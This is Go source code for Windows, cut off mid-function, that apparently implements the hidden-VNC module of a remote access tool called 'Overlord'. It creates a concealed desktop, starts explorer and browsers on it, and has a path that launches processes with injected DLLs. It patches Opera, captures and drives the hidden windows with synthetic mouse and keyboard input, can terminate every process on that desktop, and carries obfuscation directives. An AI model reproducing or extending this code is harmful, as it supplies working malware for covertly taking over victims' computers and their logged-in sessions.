//go:build windows

package capture

import (
	"fmt"
	"image"
	"log"
	"math"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unicode/utf8"
	"unsafe"
)

var (
	procCreateDesktopW           = user32.NewProc("CreateDesktopW")
	procOpenDesktopW             = user32.NewProc("OpenDesktopW")
	procCloseDesktop             = user32.NewProc("CloseDesktop")
	procSetThreadDesktop         = user32.NewProc("SetThreadDesktop")
	procGetThreadDesktop         = user32.NewProc("GetThreadDesktop")
	procSwitchDesktop            = user32.NewProc("SwitchDesktop")
	procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
	procGetDesktopWindow         = user32.NewProc("GetDesktopWindow")
	procGetWindowRect            = user32.NewProc("GetWindowRect")
	procIsWindowVisible          = user32.NewProc("IsWindowVisible")
	procPrintWindow              = user32.NewProc("PrintWindow")
	procGetWindow                = user32.NewProc("GetWindow")
	procGetTopWindow             = user32.NewProc("GetTopWindow")
	procCreateProcessW           = kernel32.NewProc("CreateProcessW")
	procSendInputbackstage            = user32.NewProc("SendInput")
	procGetCursorPosbackstage         = user32.NewProc("GetCursorPos")
	procWindowFromPoint          = user32.NewProc("WindowFromPoint")
	procScreenToClient           = user32.NewProc("ScreenToClient")
	procPostMessageW             = user32.NewProc("PostMessageW")
	procSendMessageTimeoutW      = user32.NewProc("SendMessageTimeoutW")
	procSetWindowPos             = user32.NewProc("SetWindowPos")
	procSetForegroundWindow      = user32.NewProc("SetForegroundWindow")
	procSetActiveWindow          = user32.NewProc("SetActiveWindow")
	procSetFocus                 = user32.NewProc("SetFocus")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetAncestor              = user32.NewProc("GetAncestor")
	procMapVirtualKeyW           = user32.NewProc("MapVirtualKeyW")
	procToUnicode                = user32.NewProc("ToUnicode")
	procGetWindowPlacement       = user32.NewProc("GetWindowPlacement")
	procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
	procEnumDesktopWindows       = user32.NewProc("EnumDesktopWindows")
	procTerminateProcess         = kernel32.NewProc("TerminateProcess")
	procGetWindowLongPtrW        = user32.NewProc("GetWindowLongPtrW")
	procSetWindowLongPtrW        = user32.NewProc("SetWindowLongPtrW")
)

const (
	DESKTOP_READOBJECTS     = 0x0001
	DESKTOP_CREATEWINDOW    = 0x0002
	DESKTOP_CREATEMENU      = 0x0004
	DESKTOP_HOOKCONTROL     = 0x0008
	DESKTOP_JOURNALRECORD   = 0x0010
	DESKTOP_JOURNALPLAYBACK = 0x0020
	DESKTOP_ENUMERATE       = 0x0040
	DESKTOP_WRITEOBJECTS    = 0x0080
	DESKTOP_SWITCHDESKTOP   = 0x0100

	GENERIC_ALL = 0x10000000

	DESKTOP_ALL_ACCESS = DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW |
		DESKTOP_CREATEMENU | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD |
		DESKTOP_JOURNALPLAYBACK | DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS |
		DESKTOP_SWITCHDESKTOP | GENERIC_ALL

	GW_HWNDFIRST         = 0
	GW_HWNDLAST          = 1
	GW_HWNDNEXT          = 2
	GW_HWNDPREV          = 3
	PW_RENDERFULLCONTENT = 0x00000002

	STARTF_USESIZE         = 0x00000002
	STARTF_USEPOSITION     = 0x00000004
	CREATE_NEW_CONSOLE     = 0x00000010
	SWP_NOSIZE             = 0x0001
	SWP_NOZORDER           = 0x0004
	SWP_NOACTIVATE         = 0x0010
	SWP_SHOWWINDOW         = 0x0040
	MOUSEEVENTF_MOVE       = 0x0001
	MOUSEEVENTF_LEFTDOWN   = 0x0002
	MOUSEEVENTF_LEFTUP     = 0x0004
	MOUSEEVENTF_RIGHTDOWN  = 0x0008
	MOUSEEVENTF_RIGHTUP    = 0x0010
	MOUSEEVENTF_MIDDLEDOWN = 0x0020
	MOUSEEVENTF_MIDDLEUP   = 0x0040
	MOUSEEVENTF_WHEEL      = 0x0800
	MOUSEEVENTF_ABSOLUTE   = 0x8000
	INPUT_MOUSE            = 0
	INPUT_KEYBOARD         = 1
	KEYEVENTF_KEYUP        = 0x0002
	VK_SHIFT               = 0x10
	VK_CONTROL             = 0x11
	VK_MENU                = 0x12
	VK_CAPITAL             = 0x14
	VK_LSHIFT              = 0xA0
	VK_RSHIFT              = 0xA1
	VK_LCONTROL            = 0xA2
	VK_RCONTROL            = 0xA3
	VK_LMENU               = 0xA4
	VK_RMENU               = 0xA5
	WM_MOUSEMOVE           = 0x0200
	WM_LBUTTONDOWN         = 0x0201
	WM_LBUTTONUP           = 0x0202
	WM_RBUTTONDOWN         = 0x0204
	WM_RBUTTONUP           = 0x0205
	WM_MBUTTONDOWN         = 0x0207
	WM_MBUTTONUP           = 0x0208
	WM_NCHITTEST           = 0x0084
	WM_NCLBUTTONDOWN       = 0x00A1
	WM_NCLBUTTONUP         = 0x00A2
	WM_CLOSE               = 0x0010
	WM_DESTROY             = 0x0002
	WM_SYSCOMMAND          = 0x0112
	WM_KEYDOWN             = 0x0100
	WM_KEYUP               = 0x0101
	WM_CHAR                = 0x0102
	WM_MOUSEWHEEL          = 0x020A
	MK_LBUTTON             = 0x0001
	MK_RBUTTON             = 0x0002
	MK_MBUTTON             = 0x0010
	WHEEL_DELTA            = 120
	HTCAPTION              = 2
	HTCLIENT               = 1
	HTCLOSE                = 20
	HTMINBUTTON            = 8
	HTMAXBUTTON            = 9
	HTLEFT                 = 10
	HTRIGHT                = 11
	HTTOP                  = 12
	HTTOPLEFT              = 13
	HTTOPRIGHT             = 14
	HTBOTTOM               = 15
	HTBOTTOMLEFT           = 16
	HTBOTTOMRIGHT          = 17
	SC_MINIMIZE            = 0xF020
	SC_MAXIMIZE            = 0xF030
	SC_RESTORE             = 0xF120
	SW_SHOWMAXIMIZED       = 3
	GA_ROOT                = 2
	SMTO_ABORTIFHUNG       = 0x0002

	GWL_EXSTYLE     = -20
	WS_EX_TOOLWINDOW = 0x00000080
)

var (
	backstageDesktopHandle   uintptr
	backstageDesktopMu       sync.Mutex
	backstageDesktopName     = "OverlordHiddenDesktop"
	backstageInitialized     bool
	backstageOriginalDesktop uintptr
	backstageCursorEnabled   bool
	backstageThreadOnce      sync.Once
	backstageThreadErr       error
	backstageThreadReady     chan struct{}
	backstageThreadTasks     chan backstageTask
	backstageWatchdogOnce    sync.Once
	backstageNoWindowLogNs   atomic.Int64
	backstageInputMu         sync.Mutex
	backstageLastCursor      point
	backstageHasCursor       bool
	backstageWorkingWindow   uintptr
	backstageShiftDown       bool
	backstageCtrlDown        bool
	backstageAltDown         bool
	backstageCapsLock        bool
	backstageMovingWindow    bool
	backstageMoveOffset      point
	backstageWindowSize      point
	backstageWindowToMove    uintptr
	backstageMouseButtons    uint32
	backstagePendingActivate uintptr
	backstageExplorerStarted bool
	backstageTaskSeq         atomic.Uint64
	backstageCurrentTaskID   atomic.Uint64
	backstageCurrentTaskKind atomic.Int64
	backstageCurrentTaskNs   atomic.Int64
	backstageLastScale       atomic.Uint64 // float64 bits — scale used by last backstage capture

	// Capture cache: pooled DC/DIB per window to avoid per-frame allocation
	backstageWinCache     map[uintptr]*backstageWinCacheEntry
	backstageWinCachePrev []byte

	backstageCompHdcMem uintptr
	backstageCompHbmp   uintptr
	backstageCompBits   unsafe.Pointer
	backstageCompW      int
	backstageCompH      int

	backstagePendingMouseMove *backstageTask
	backstagePendingMoveMu    sync.Mutex
)

type backstageTaskKind int

const (
	backstageTaskCapture backstageTaskKind = iota
	backstageTaskStartProcess
	backstageTaskStartProcessInjected
	backstageTaskMouseMove
	backstageTaskMouseDown
	backstageTaskMouseUp
	backstageTaskKeyDown
	backstageTaskKeyUp
	backstageTaskMouseWheel
	backstageTaskAutoStartExplorer
)

type backstageTask struct {
	kind            backstageTaskKind
	id              uint64
	display         int
	filePath        string
	x               int32
	y               int32
	button          int
	vk              uint16
	text            string
	delta           int32
	dllBytes        []byte
	captureDllBytes []byte
	searchPath      string
	replacePath     string
	queuedAt        time.Time
	resp            chan backstageTaskResult
}

type backstageTaskResult struct {
	img *image.RGBA
	err error
	pid uint32
}

type startupInfo struct {
	cb              uint32
	lpReserved      *uint16
	lpDesktop       *uint16
	lpTitle         *uint16
	dwX             uint32
	dwY             uint32
	dwXSize         uint32
	dwYSize         uint32
	dwXCountChars   uint32
	dwYCountChars   uint32
	dwFillAttribute uint32
	dwFlags         uint32
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     *byte
	hStdInput       uintptr
	hStdOutput      uintptr
	hStdErr         uintptr
}

type processInformation struct {
	hProcess    uintptr
	hThread     uintptr
	dwProcessId uint32
	dwThreadId  uint32
}

type mouseInput struct {
	dx          int32
	dy          int32
	mouseData   uint32
	dwFlags     uint32
	time        uint32
	dwExtraInfo uintptr
}

type backstageWinCacheEntry struct {
	hdcMem uintptr
	hbmp   uintptr
	bits   unsafe.Pointer
	w, h   int
	lastOK bool
	age    int
}

type keybdInput struct {
	wVk         uint16
	wScan       uint16
	dwFlags     uint32
	time        uint32
	dwExtraInfo uintptr
}

type input struct {
	inputType uint32
	union     [24]byte
}

func getCurrentThreadId() uint32 {
	r, _, _ := procGetCurrentThreadId.Call()
	return uint32(r)
}

func getThreadDesktop(threadId uint32) uintptr {
	r, _, _ := procGetThreadDesktop.Call(uintptr(threadId))
	return r
}

func isWindowVisible(hwnd uintptr) bool {
	r, _, _ := procIsWindowVisible.Call(hwnd)
	return r != 0
}

func printWindow(hwnd, hdc uintptr, flags uint32) bool {
	r, _, _ := procPrintWindow.Call(hwnd, hdc, uintptr(flags))
	return r != 0
}

func getWindow(hwnd uintptr, cmd uint32) uintptr {
	r, _, _ := procGetWindow.Call(hwnd, uintptr(cmd))
	return r
}

func getTopWindow(hwnd uintptr) uintptr {
	r, _, _ := procGetTopWindow.Call(hwnd)
	return r
}

func InitializebackstageDesktop() error {
	backstageDesktopMu.Lock()
	defer backstageDesktopMu.Unlock()

	if backstageInitialized && backstageDesktopHandle != 0 {
		return nil
	}

	threadId := getCurrentThreadId()
	backstageOriginalDesktop = getThreadDesktop(threadId)

	desktopNamePtr, err := syscall.UTF16PtrFromString(backstageDesktopName)
	if err != nil {
		return fmt.Errorf("failed to convert desktop name: %v", err)
	}

	r, _, _ := procOpenDesktopW.Call(
		uintptr(unsafe.Pointer(desktopNamePtr)),
		0,
		0,
		uintptr(DESKTOP_ALL_ACCESS),
	)

	if r == 0 {
		r, _, err = procCreateDesktopW.Call(
			uintptr(unsafe.Pointer(desktopNamePtr)),
			0,
			0,
			0,
			uintptr(DESKTOP_ALL_ACCESS),
			0,
		)

		if r == 0 {
			return fmt.Errorf("failed to create hidden desktop: %v", err)
		}
	}

	backstageDesktopHandle = r
	backstageInitialized = true
	return nil
}

func CleanupbackstageDesktop() {
	backstageDesktopMu.Lock()
	defer backstageDesktopMu.Unlock()

	backstageCleanupFrameReaders()

	backstageFreeCapCache()

	for _, entry := range backstageWinCache {
		backstageFreeCacheEntry(entry)
	}
	backstageWinCache = nil
	backstageWinCachePrev = nil

	if backstageCompHbmp != 0 {
		deleteObject(backstageCompHbmp)
		backstageCompHbmp = 0
	}
	if backstageCompHdcMem != 0 {
		deleteDC(backstageCompHdcMem)
		backstageCompHdcMem = 0
	}
	backstageCompBits = nil
	backstageCompW = 0
	backstageCompH = 0

	backstageInputMu.Lock()
	backstageShiftDown = false
	backstageCtrlDown = false
	backstageAltDown = false
	backstageCapsLock = false
	backstageMouseButtons = 0
	backstageHasCursor = false
	backstageWorkingWindow = 0
	backstageInputMu.Unlock()
	backstageLastScale.Store(0)

	if backstageDesktopHandle != 0 {
		if backstageOriginalDesktop != 0 {
			procSetThreadDesktop.Call(backstageOriginalDesktop)
		}

		procCloseDesktop.Call(backstageDesktopHandle)
		backstageDesktopHandle = 0
	}
	backstageInitialized = false
	backstageExplorerStarted = false

	uiaCleanup()
	uiaClearActiveElement()
	resetWinUI3Cache()
	resetInputSiteCache()

	if backstageThreadTasks != nil {
		close(backstageThreadTasks)
		backstageThreadTasks = nil
	}
	backstageThreadReady = nil
	backstageThreadErr = nil
	backstageThreadOnce = sync.Once{}
	backstageWatchdogOnce = sync.Once{}
}

func SetbackstageCursorCapture(enabled bool) {
	backstageCursorEnabled = enabled
}

func backstageDesktopBounds() (image.Rectangle, bool) {
	hwnd, _, _ := procGetDesktopWindow.Call()
	if hwnd == 0 {
		return image.Rectangle{}, false
	}
	var r rect
	ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
	if ok == 0 {
		return image.Rectangle{}, false
	}
	if r.right <= r.left || r.bottom <= r.top {
		return image.Rectangle{}, false
	}
	return image.Rect(int(r.left), int(r.top), int(r.right), int(r.bottom)), true
}

func ensurebackstageThread() error {
	backstageDesktopMu.Lock()
	desktopHandle := backstageDesktopHandle
	backstageDesktopMu.Unlock()

	if desktopHandle == 0 {
		return fmt.Errorf("backstage desktop not initialized")
	}

	backstageThreadOnce.Do(func() {
		backstageThreadReady = make(chan struct{})
		backstageThreadTasks = make(chan backstageTask)
		backstageWatchdogOnce.Do(func() {
			go func() {
				defer recoverAndLog("backstage watchdog", nil)
				backstageThreadWatchdog()
			}()
		})
		go func(handle uintptr) {
			defer recoverAndLog("backstage desktop thread", nil)
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			r, _, err := procSetThreadDesktop.Call(handle)
			if r == 0 {
				backstageThreadErr = fmt.Errorf("failed to set thread desktop: %v", err)
				close(backstageThreadReady)
				for task := range backstageThreadTasks {
					task.resp <- backstageTaskResult{err: backstageThreadErr}
				}
				return
			}

			close(backstageThreadReady)
			for task := range backstageThreadTasks {
				start := time.Now()
				backstageCurrentTaskID.Store(task.id)
				backstageCurrentTaskKind.Store(int64(task.kind))
				backstageCurrentTaskNs.Store(start.UnixNano())

				if shouldTracebackstageTask(task.kind) {
					log.Printf("backstage task: start id=%d kind=%s queued=%s details=%s", task.id, backstageTaskKindName(task.kind), start.Sub(task.queuedAt).Round(time.Millisecond), backstageTaskDetails(task))
				}

				var result backstageTaskResult
				switch task.kind {
				case backstageTaskStartProcess:
					result.pid, result.err = startbackstageProcessOnThread(task.filePath, task.display)
				case backstageTaskStartProcessInjected:
					result.pid, result.err = startbackstageProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath, task.display)
				case backstageTaskMouseMove:
					result.err = backstageMouseMoveOnThread(task.display, task.x, task.y)
				case backstageTaskMouseDown:
					result.err = backstageMouseButtonOnThread(task.button, true)
				case backstageTaskMouseUp:
					result.err = backstageMouseButtonOnThread(task.button, false)
				case backstageTaskKeyDown:
					result.err = backstageKeyOnThread(task.vk, task.text, true)
				case backstageTaskKeyUp:
					result.err = backstageKeyOnThread(task.vk, "", false)
				case backstageTaskMouseWheel:
					result.err = backstageMouseWheelOnThread(task.delta)
				case backstageTaskAutoStartExplorer:
					result.err = backstageAutoStartExplorerOnThread()
				default:
					result.img, result.err = BackstageCaptureDisplayOnThread(task.display)
				}

				dur := time.Since(start)
				if shouldTracebackstageTask(task.kind) || dur > 400*time.Millisecond {
					if result.err != nil {
						log.Printf("backstage task: done id=%d kind=%s dur=%s err=%v", task.id, backstageTaskKindName(task.kind), dur.Round(time.Millisecond), result.err)
					} else {
						log.Printf("backstage task: done id=%d kind=%s dur=%s", task.id, backstageTaskKindName(task.kind), dur.Round(time.Millisecond))
					}
				}

				backstageCurrentTaskNs.Store(0)
				backstageCurrentTaskKind.Store(-1)
				backstageCurrentTaskID.Store(0)
				task.resp <- result
			}
		}(desktopHandle)
	})

	if backstageThreadReady != nil {
		<-backstageThreadReady
	}

	return backstageThreadErr
}

func BackstageCaptureDisplay(display int) (*image.RGBA, error) {
	if err := ensurebackstageThread(); err != nil {
		return nil, err
	}

	resp := make(chan backstageTaskResult, 1)
	backstageThreadTasks <- backstageTask{kind: backstageTaskCapture, display: display, resp: resp}
	result := <-resp
	return result.img, result.err
}

func StartbackstageProcess(filePath string, operaPatch bool, display int) error {
	if filePath == "" {
		return fmt.Errorf("empty file path")
	}
	result, err := executebackstageTask(backstageTask{
		kind:     backstageTaskStartProcess,
		filePath: strings.TrimSpace(filePath),
		display:  display,
	}, 10*time.Second)
	if err != nil {
		return err
	}
	if result.err != nil {
		return result.err
	}
	if operaPatch && result.pid != 0 {
		go func() {
			defer recoverAndLog("backstage patch opera", nil)
			patchOperaAsync(result.pid, 5, 2*time.Second)
		}()
	}
	return nil
}

func BackstageKillAll() error {
	backstageDesktopMu.Lock()
	deskHandle := backstageDesktopHandle
	backstageDesktopMu.Unlock()
	if deskHandle == 0 {
		return fmt.Errorf("backstage desktop not initialized")
	}

	pids := make(map[uint32]struct{})
	cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
		var pid uint32
		procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
		if pid != 0 {
			pids[pid] = struct{}{}
		}
		return 1 // continue enumeration
	})
	procEnumDesktopWindows.Call(deskHandle, cb, 0)

	const PROCESS_TERMINATE = 0x0001
	killed := 0
	for pid := range pids {
		hProc, _, _ := procOpenProcess.Call(PROCESS_TERMINATE, 0, uintptr(pid))
		if hProc != 0 {
			procTerminateProcess.Call(hProc, 1)
			kernel32.NewProc("CloseHandle").Call(hProc)
			killed++
		}
	}
	log.Printf("backstage: kill all: terminated %d processes across %d pids", killed, len(pids))
	return nil
}

func BackstageAutoStartExplorer() error {
	if backstageExplorerStarted {
		return nil
	}
	result, err := executebackstageTask(backstageTask{
		kind: backstageTaskAutoStartExplorer,
	}, 15*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func BackstageInputMouseMove(display int, x, y int32) error {
	result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseMove, display: display, x: x, y: y}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func BackstageInputMouseDown(button int) error {
	result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseDown, button: button}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func BackstageInputMouseUp(button int) error {
	result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseUp, button: button}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func BackstageInputKeyDown(vk uint16, text string) error {
	result, err := executebackstageTask(backstageTask{kind: backstageTaskKeyDown, vk: vk, text: printableKeyText(text)}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func BackstageInputKeyUp(vk uint16) error {
	result, err := executebackstageTask(backstageTask{kind: backstageTaskKeyUp, vk: vk}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func BackstageInputMouseWheel(delta int32) error {
	result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseWheel, delta: delta}, 3*time.Second)
	if err != nil {
		return err
	}
	return result.err
}

func executebackstageTask(task backstageTask, timeout time.Duration) (backstageTaskResult, error) {
	if err := ensurebackstageThread(); err != nil {
		return backstageTaskResult{}, err
	}
	if backstageThreadTasks == nil {
		return backstageTaskResult{}, fmt.Errorf("backstage thread not available")
	}
	if timeout <= 0 {
		timeout = 3 * time.Second
	}

	task.resp = make(chan backstageTaskResult, 1)
	task.id = backstageTaskSeq.Add(1)
	task.queuedAt = time.Now()
	timer := time.NewTimer(timeout)
	defer timer.Stop()

	select {
	case backstageThreadTasks <- task:
	case <-timer.C:
		log.Printf("backstage input: task enqueue timeout id=%d kind=%s timeout=%s", task.id, backstageTaskKindName(task.kind), timeout)
		return backstageTaskResult{}, fmt.Errorf("backstage task queue timed out")
	}

	select {
	case result := <-task.resp:
		return result, nil
	case <-timer.C:
		log.Printf("backstage input: task execution timeout id=%d kind=%s timeout=%s", task.id, backstageTaskKindName(task.kind), timeout)
		return backstageTaskResult{}, fmt.Errorf("backstage task execution timed out")
	}
}

func backstageThreadWatchdog() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		id := backstageCurrentTaskID.Load()
		if id == 0 {
			continue
		}
		startNs := backstageCurrentTaskNs.Load()
		if startNs == 0 {
			continue
		}
		running := time.Since(time.Unix(0, startNs))
		if running >= 2*time.Second {
			kind := backstageTaskKindName(backstageTaskKind(backstageCurrentTaskKind.Load()))
			log.Printf("backstage watchdog: thread appears stuck id=%d kind=%s running=%s", id, kind, running.Round(time.Millisecond))
		}
	}
}

func shouldTracebackstageTask(kind backstageTaskKind) bool {
	switch kind {
	case backstageTaskMouseDown, backstageTaskMouseUp, backstageTaskKeyDown, backstageTaskKeyUp, backstageTaskMouseWheel, backstageTaskStartProcess, backstageTaskStartProcessInjected, backstageTaskAutoStartExplorer:
		return true
	default:
		return false
	}
}

func backstageTaskKindName(kind backstageTaskKind) string {
	switch kind {
	case backstageTaskCapture:
		return "capture"
	case backstageTaskStartProcess:
		return "start_process"
	case backstageTaskStartProcessInjected:
		return "start_process_injected"
	case backstageTaskMouseMove:
		return "mouse_move"
	case backstageTaskMouseDown:
		return "mouse_down"
	case backstageTaskMouseUp:
		return "mouse_up"
	case backstageTaskKeyDown:
		return "key_down"
	case backstageTaskKeyUp:
		return "key_up"
	case backstageTaskMouseWheel:
		return "mouse_wheel"
	case backstageTaskAutoStartExplorer:
		return "auto_start_explorer"
	default:
		return fmt.Sprintf("unknown(%d)", kind)
	}
}

func backstageTaskDetails(task backstageTask) string {
	switch task.kind {
	case backstageTaskMouseDown, backstageTaskMouseUp:
		return fmt.Sprintf("button=%d", task.button)
	case backstageTaskKeyDown, backstageTaskKeyUp:
		return fmt.Sprintf("vk=%d", task.vk)
	case backstageTaskMouseWheel:
		return fmt.Sprintf("delta=%d", task.delta)
	case backstageTaskStartProcess:
		return fmt.Sprintf("cmd=%q", task.filePath)
	case backstageTaskStartProcessInjected:
		return fmt.Sprintf("cmd=%q search=%q replace=%q dllSize=%d", task.filePath, task.searchPath, task.replacePath, len(task.dllBytes))
	default:
		return ""
	}
}

var (
	backstageCapHDCScreen uintptr
	backstageCapHDCMem    uintptr
	backstageCapHBMP      uintptr
	backstageCapBits      unsafe.Pointer
	backstageCapW         int
	backstageCapH         int
	backstageCapImg       *image.RGBA
)

func backstageFreeCapCache() {
	if backstageCapHBMP != 0 {
		deleteObject(backstageCapHBMP)
		backstageCapHBMP = 0
	}
	if backstageCapHDCMem != 0 {
		deleteDC(backstageCapHDCMem)
		backstageCapHDCMem = 0
	}
	if backstageCapHDCScreen != 0 {
		releaseDC(0, backstageCapHDCScreen)
		backstageCapHDCScreen = 0
	}
	backstageCapBits = nil
	backstageCapW = 0
	backstageCapH = 0
	backstageCapImg = nil
}

func backstageEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
	if backstageCapHDCScreen == 0 {
		backstageCapHDCScreen = getDC(0)
		if backstageCapHDCScreen == 0 {
			return 0, 0, nil, false
		}
	}
	if backstageCapHDCMem != 0 && backstageCapW == w && backstageCapH == h && backstageCapBits != nil {
		buf := unsafe.Slice((*byte)(backstageCapBits), w*h*4)
		return backstageCapHDCScreen, backstageCapHDCMem, buf, true
	}
	if backstageCapHBMP != 0 {
		deleteObject(backstageCapHBMP)
		backstageCapHBMP = 0
	}
	if backstageCapHDCMem != 0 {
		deleteDC(backstageCapHDCMem)
		backstageCapHDCMem = 0
	}
	backstageCapHDCMem = createCompatibleDC(backstageCapHDCScreen)
	if backstageCapHDCMem == 0 {
		return 0, 0, nil, false
	}
	bmi := bitmapInfo{
		bmiHeader: bitmapInfoHeader{
			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
			biWidth:       int32(w),
			biHeight:      -int32(h),
			biPlanes:      1,
			biBitCount:    32,
			biCompression: BI_RGB,
		},
	}
	backstageCapHBMP = createDIBSection(backstageCapHDCMem, &bmi, DIB_RGB_COLORS, &backstageCapBits)
	if backstageCapHBMP == 0 || backstageCapBits == nil {
		deleteDC(backstageCapHDCMem)
		backstageCapHDCMem = 0
		return 0, 0, nil, false
	}
	selectObject(backstageCapHDCMem, backstageCapHBMP)
	backstageCapW = w
	backstageCapH = h
	backstageCapImg = nil
	buf := unsafe.Slice((*byte)(backstageCapBits), w*h*4)
	return backstageCapHDCScreen, backstageCapHDCMem, buf, true
}

func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	captureMu.Lock()
	defer captureMu.Unlock()

	setDPIAware()

	maxDisplays := displayCount()
	if maxDisplays <= 0 {
		maxDisplays = 1
	}
	if display < 0 || display >= maxDisplays {
		log.Printf("backstage capture: requested display %d out of range (0-%d), defaulting to 0", display, maxDisplays-1)
		display = 0
	}

	bounds, boundsSource := backstageResolveCaptureBounds(display)
	srcW := bounds.Dx()
	srcH := bounds.Dy()
	if srcW <= 0 || srcH <= 0 {
		log.Printf("backstage capture: invalid bounds for display=%d source=%s bounds=%v", display, boundsSource, bounds)
		return nil, syscall.EINVAL
	}

	userScale := effectiveScale(srcW, srcH)
	backstageLastScale.Store(math.Float64bits(userScale))
	dstW := int(float64(srcW) * userScale)
	dstH := int(float64(srcH) * userScale)
	if dstW <= 0 || dstH <= 0 {
		dstW = srcW
		dstH = srcH
	}

	capW := srcW
	capH := srcH

	hdcScreen, hdcMem, buf, ok := backstageEnsureCapCache(capW, capH)
	if !ok {
		return nil, syscall.EINVAL
	}

	for i := range buf {
		buf[i] = 0
	}

	drawn := drawbackstageWindowsToBuffer(hdcScreen, bounds, buf, capW*4)
	if drawn == 0 {
		now := time.Now().UnixNano()
		last := backstageNoWindowLogNs.Load()
		if now-last > int64(5*time.Second) && backstageNoWindowLogNs.CompareAndSwap(last, now) {
			log.Printf("backstage capture: no windows drawn for display=%d source=%s bounds=%v", display, boundsSource, bounds)
		}
	}

	swapRB(buf)

	img := backstageCapImg
	if img == nil || img.Bounds().Dx() != capW || img.Bounds().Dy() != capH {
		img = image.NewRGBA(image.Rect(0, 0, capW, capH))
		backstageCapImg = img
	}
	copy(img.Pix, buf)

	_ = hdcMem

	if dstW != capW || dstH != capH {
		img = resizeNearest(img, dstW, dstH)
	}

	return img, nil
}

func startbackstageProcessOnThread(filePath string, display int) (uint32, error) {
	if filePath == "" {
		return 0, fmt.Errorf("empty file path")
	}

	desktopNamePtr, err := syscall.UTF16PtrFromString(backstageDesktopName)
	if err != nil {
		return 0, fmt.Errorf("failed to convert desktop name: %v", err)
	}
	cmdLine, err := syscall.UTF16FromString(filePath)
	if err != nil {
		return 0, fmt.Errorf("failed to convert command line: %v", err)
	}
	posX, posY := 0, 0
	if mons := monitorList(); display >= 0 && display < len(mons) {
		posX = mons[display].rect.Min.X
		posY = mons[display].rect.Min.Y
	}
	var si startupInfo
	var pi processInformation
	si.cb = uint32(unsafe.Sizeof(si))
	si.lpDesktop = desktopNamePtr
	si.dwX = uint32(posX)
	si.dwY = uint32(posY)
	si.dwFlags = STARTF_USEPOSITION

	ret, _, callErr := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(&cmdLine[0])),
		0,
		0,
		0,
		uintptr(CREATE_NEW_CONSOLE),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		if callErr != nil {
			return 0, fmt.Errorf("CreateProcess failed: %v", callErr)
		}
		return 0, fmt.Errorf("CreateProcess failed")
	}
	return pi.dwProcessId, nil
}

func backstageAutoStartExplorerOnThread() error {
	if backstageExplorerStarted {
		return nil
	}

	if isExplorerRunningToolhelp() {
		log.Printf("backstage: explorer.exe already running on backstage desktop, skipping auto-start")
		backstageExplorerStarted = true
		return nil
	}

	log.Printf("backstage: no explorer.exe found on backstage desktop, starting explorer.exe")
	_, err := startbackstageProcessOnThread("explorer.exe", 0)
	if err != nil {
		return fmt.Errorf("auto-start explorer failed: %w", err)
	}
	backstageExplorerStarted = true
	return nil
}

func isExplorerPID(pid uint32) bool {
	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	hProc, _, _ := kernel32.NewProc("OpenProcess").Call(
		PROCESS_QUERY_LIMITED_INFORMATION, 0, uintptr(pid),
	)
	if hProc == 0 {
		return false
	}
	defer procCloseHandle.Call(hProc)

	var buf [260]uint16
	size := uint32(len(buf))
	ret, _, _ := kernel32.NewProc("QueryFullProcessImageNameW").Call(
		hProc, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)),
	)
	if ret == 0 {
		return false
	}
	name := strings.ToLower(syscall.UTF16ToString(buf[:size]))
	return strings.HasSuffix(name, `\explorer.exe`)
}

func isExplorerRunningToolhelp() bool {
	const TH32CS_SNAPPROCESS = 0x00000002
	snap, _, _ := kernel32.NewProc("CreateToolhelp32Snapshot").Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return false
	}
	defer procCloseHandle.Call(snap)

	type processEntry32 struct {
		dwSize              uint32
		cntUsage            uint32
		th32ProcessID       uint32
		th32DefaultHeapID   uintptr
		th32ModuleID        uint32
		cntThreads          uint32
		th32ParentProcessID uint32
		pcPriClassBase      int32
		dwFlags             uint32
		szExeFile           [260]uint16
	}

	var pe processEntry32
	pe.dwSize = uint32(unsafe.Sizeof(pe))
	ret, _, _ := kernel32.NewProc("Process32FirstW").Call(snap, uintptr(unsafe.Pointer(&pe)))
	for ret != 0 {
		name := strings.ToLower(syscall.UTF16ToString(pe.szExeFile[:]))
		if name == "explorer.exe" {
			return true
		}
		pe.dwSize = uint32(unsafe.Sizeof(pe))
		ret, _, _ = kernel32.NewProc("Process32NextW").Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return false
}

func backstageMouseMoveOnThread(display int, x, y int32) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
